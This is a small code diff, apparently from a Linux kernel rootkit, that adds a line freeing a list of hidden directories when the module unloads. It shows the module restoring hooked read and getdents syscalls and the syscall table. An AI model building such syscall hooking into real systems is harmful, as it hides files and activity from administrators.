@@ -53,5 +53,6 @@ void cleanup_module() {
 	unpatch(SYS_read);
 	unpatch(SYS_getdents);
 	memcpy(sys_call_table, backup_sys_call_table, sizeof(backup_sys_call_table));
+	vector_free(hiddenDirectories);
 	printk(KERN_INFO "Module unloaded\n");
 }
